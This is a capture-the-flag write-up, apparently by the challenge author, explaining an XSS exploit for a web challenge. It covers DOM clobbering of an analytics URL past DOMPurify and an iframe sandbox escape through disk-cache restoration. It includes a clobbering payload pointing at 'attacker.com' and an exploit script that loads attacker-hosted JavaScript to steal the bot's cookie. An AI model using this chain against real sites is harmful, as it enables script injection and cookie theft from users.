## QnqSec CTF 2025 ~ Secure Letter Revenge Web

Twitter: [@L3G4CY5](https://x.com/L3G4CY5)

I've authored a Secure Letter and Secure Letter Revenge web challenges on QnQSec CTF 2025. I won’t write up Secure Letter because it’s fairly trivial..

Secure Letter Description:
```
I've made a secure letter app that supports all browsers, even the oldest ones! 
I've even specifically told my AI make it SUPER secure!
```

This ^ was the same app, just had an unintended simple xss on /letter?content= endpoint :face_exhaling: . Never believe cursor.

Secure Letter Revenge Description:
```
I told Ai to fix all my bugs again... No one is getting in this time

Note: use web:3001 for bot .
```
Solves: 3
https://ctf.qnqsec.team/challenges#secure-letter-revenge-75

Exploit TLDR; 

- Abuse iframe's reparenting with disk cache to escape the sandbox
- Use dom cloberring to clobber a gadget and load your own javascript
- XSS!

## Short Overview

The handout files included a backend in `server.js` which just had some basic routes for Letter App but the server side was irrelevant. There was also `bot.js` which was a bot that visits the challenge site, sets the flag as cookie then visits the reported url.

The challenge setup immediately indicates that this is indeed an XSS challenge.

## Challenge

I will only provide code snippets that are relevant to the exploit.

<img width="1468" height="829" alt="image" src="https://github.com/user-attachments/assets/52356b94-58d8-4d47-ac0b-061bb6123ac3" />

`letter-writer.html` ^ is the index page for the website.
```html
<button onclick="updateLetter()">Update Letter</button>
<button onclick="createSharedLetter()" style="...">Create Letter</button>
...
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.7/dist/purify.min.js"></script> 
<script src="letter-writer.js"></script>
```
It loads `DOMPurify` and `letter-writer.js` and wires the buttons to the functions.

`letter-writer.js` (relevant parts):
```javascript
window.updateLetter = function() {
    const content = document.getElementById('letterContent').value;
    const sanitizedContent = DOMPurify.sanitize(content);          
    const sanitizedCookie = DOMPurify.sanitize(document.cookie?document.cookie:'test');
    currentLetter = content;
    
    const f = document.getElementById('letterFrame');
    f.setAttribute('sandbox', 'allow-same-origin');
 

    const letterHTML = `<!DOCTYPE html>
    <html>
    <body>
    <div id="letterText">
    ${sanitizedContent}
    </div>
    <!-- Analytics; notloaded -->
    <script>
        console.log("Load analytics")
        function loadAnalytics() {

            const defaultAnalyticsURL = location.origin + "/analytics.js";
            const candidate = window.cfg.analyticsURL ?? defaultAnalyticsURL;

            try {
                const url = new URL(candidate).toString();

                document.uid = ${JSON.stringify(sanitizedCookie)};
                const script = document.createElement('script');
                
                script.src = url;
                script.async = true;  

                document.body.appendChild(script);
            } catch (err) {
                // silent Error
            }
        }

        // Polyfilled async scheduling for better cross-browser and old browser support . (queueMicrotask not supported in old browsers)
        const channel = new MessageChannel();
        channel.port1.postMessage('loadAnalytics');
        channel.port2.onmessage = (e) => {
            if (e.data === 'loadAnalytics') {
                loadAnalytics();
            }
        }
    </script>
</body>
    </html>`;
    f.src = 'data:text/html,' + letterHTML;

const urlParams = new URLSearchParams(window.location.search);
const letterParam = urlParams.get('letter') || `...`;

document.getElementById('letterContent').value = letterParam;


const updateLetterParam = urlParams.get('updateLetter');
setTimeout(() => {if (updateLetterParam) { //Avoid collision 
    updateLetter();
}}, 1500);
    
}
```

When the letter is updated, input is read from the textbox, then sanitized with DOMPurify. The cookie is also sanitized. DOMPurify here is recent, so no obvious bypass unless you find a 0-day. The iframe’s `sandbox` is set, and the iframe `src` is set to an inline `data:` URL. The `updateLetter` URL parameter helps automate the exploit later on.  

We can see we have html injection immediately, but there is nothing malicious we can do because of DOMPurify...

### Dom Clobbering

Let's analyze briefly the inline script for "analytics":
```html
 <script>
        console.log("Load analytics")
        function loadAnalytics() {

            const defaultAnalyticsURL = location.origin + "/analytics.js";
            const candidate = window.cfg.analyticsURL ?? defaultAnalyticsURL;

            try {
                const url = new URL(candidate).toString();

                document.uid = ${JSON.stringify(sanitizedCookie)};
                const script = document.createElement('script');
                
                script.src = url;
                script.async = true;  

                document.body.appendChild(script);
            } catch (err) {
                // silent Error
            }
        }

        // Polyfilled async scheduling for better cross-browser and old browser support . (queueMicrotask not supported in old browsers)
        const channel = new MessageChannel();
        channel.port1.postMessage('loadAnalytics');
        channel.port2.onmessage = (e) => {
            if (e.data === 'loadAnalytics') {
                loadAnalytics();
            }
        }
    </script>
```

There is `loadAnalytics` function that has variables for analytics url, itchecks if there is a `window.cfg.analyticsURL` value inside the window, if no it will use the `defaultAnalyticsURL`. This should immediately trigger a dom clobbering bell in your head, but lets continue. It takes this url, creates a script tag and uses the url for `src` value inside the script tag.

We can also see this weird way of calling the loadAnalytics() function. This is actually an old polyfill-style async scheduling technique — a hack to defer execution asynchronously (similar to `process.nextTick` or `queueMicrotask`), often used in early polyfills or async task schedulers before native APIs were available. The "dev" comment should have gave it out :) .


In this small code we can see an easy dom clobbering of the `cfg.analyticsURL` url being used to retrieve `analytics.js` .

Also we can see that the cookie is being sanitized and set inside `document.uid`, this is great for us because inside `data:` urls the cookies are completely disabled, and also all iframes with `data:` urls have no access to the `window.parent` values.

But this would be great if the script at least ran inside the iframe? :eyes: 

If we look at the website we get an error when we update the letter:
<img width="1027" height="324" alt="image" src="https://github.com/user-attachments/assets/cdd3f7c5-bb8c-4bc0-92d6-ba7447f6a16f" />

This error happens because the script inside the preview iframe is trying to execute inside the sandboxed iframe. 

Hm, well thats definitely not helpful. At first glance it might look impossible to escape the iframe sandbox... but is it?

### Sandbox Escape

Huli's [blogpost](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/#2-iframe-reparenting-and-bfcache) on iframe reparenting and bfcache explains a browser quirk we can abuse: when a page is restored from disk cache (not bfcache), some iframe properties (notably src) are restored while others (like sandbox) are not. This can create a mixed state: sandbox from one moment + src from another.

I will explain it in essence:

Using bfcache, doing a top-level navigation, and then going back will return the page to exactly the state you left it in. But if there is no bfcache, the browser uses disk cache and loads what it can from there. We can use this mechanism to exploit the iframe’s sandbox-setting logic in this app and iframe's reparenting.

With bfcache, the iframe doesn’t change when you go back, obviously. But if we load an iframe with no bfcache, then perform the challenge’s logic to set the `sandbox` attribute and `src`,then do a top-level navigation and go back to trigger the cache, we end up with a weird iframe state.

The `sandbox` state reverts to default (no sandbox, in this case), while the `src` retains the latest value. This happens because the iframe’s `src` attribute is stored and in and retrieved from the disk cache, but the `sandbox` attribute is not. The result is a mixed state: `sandbox state 1 + src value state 2` aka in our case `no sandbox + our updated letter content`.

Wow — maybe we can use this to escape?! But there’s one more issue: how do we trigger the disk cache and disable bfcache?

Reading the docs you’ll find a bfcache update showing that bfcache is now being used even when `Cache-Control: no-store` is set, except when the page is considered sensitive. A page is treated as sensitive if it involves authentication, cookies, or one of the cases is that if it was opened via window.open() .

(https://web.dev/articles/bfcache#avoid-window-opener)

(https://github.com/fergald/explainer-bfcache-ccns/blob/main/README.md#sensitive-information)

This works in our favor: we can open the page via window.open() to disable bf-cache, DOM-clobber the iframe’s analytics URL, do a top-level navigation away, then go back — the page should load values from the disk cache. 😎

Quick note: headless browsers have bfcache disabled anyway. :D
https://github.com/GoogleChrome/lighthouse/issues/14784

## Exploit

Our exploit uses these steps:

- Load the page without bfcache
- Use the html injection to clobber the analytics url value:
```html
<a id="cfg"></a> <a id="cfg" name="analyticsURL" href="attacker.com"></a>
```
- Do a top level navigation
- Then head back with `history.back()` to trigger the disk cache.

We will host the following exploit:
```html
<script>
  const win = window.open("http://web:3001/?letter=%3Ca%20id=%22cfg%22%3E%3C/a%3E%20%3Ca%20id=%22cfg%22%20name=%22analyticsURL%22%20href=%22{ATTACKER-SERVER-WITH-XSS-PAYLOAD}%22%3E%3C/a%3E&updateLetter=true"); 


  setTimeout(() => {win.location.href = "https://sameOrigin/lol"},4000)
    // here you need to use the same origin url as the one where you are hosting the exploit to be able to do history.back because of SOP
  setTimeout(()=>{win.history.back()},6000)
  </script>
```
Send the url where you hosted your exploit to the bot, wait a few sec...
and voila the flag is ours!

<img width="434" height="147" alt="image" src="https://github.com/user-attachments/assets/5625a7fd-6ceb-4e1e-86b3-fa55e0770642" />

I hope you enjoyed the challenge, the writeup and learned something new!

Solves:
- 🥇 c4_planter	
- 🥈 TCP1P	
- 🥉 AdderallOverdose
